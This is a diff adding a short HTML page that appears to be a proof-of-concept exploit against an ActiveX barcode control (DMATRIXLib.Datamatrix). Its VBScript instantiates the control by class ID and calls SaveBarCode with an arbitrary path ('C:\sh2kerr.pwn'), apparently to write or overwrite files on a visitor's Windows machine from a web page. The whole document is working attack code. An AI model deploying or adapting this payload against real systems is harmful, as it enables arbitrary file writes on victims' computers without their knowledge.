@@ -1,0 +1,15 @@
+&lt;html&gt;
+&lt;object classid=&#039;clsid:6C951D10-B07F-11DB-A6ED-0050C2490048&#039; id=&#039;target&#039; /&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+targetFile = &quot;C:\WINDOWS\system32\PRECIS~2.DLL&quot;
+prototype  = &quot;Sub SaveBarCode ( ByVal path As String )&quot;
+memberName = &quot;SaveBarCode&quot;
+progid     = &quot;DMATRIXLib.Datamatrix&quot;
+argCount   = 1
+
+arg1=&quot;C:\sh2kerr.pwn&quot;
+
+target.SaveBarCode arg1
+
+&lt;/script&gt;
+&lt;/html&gt;
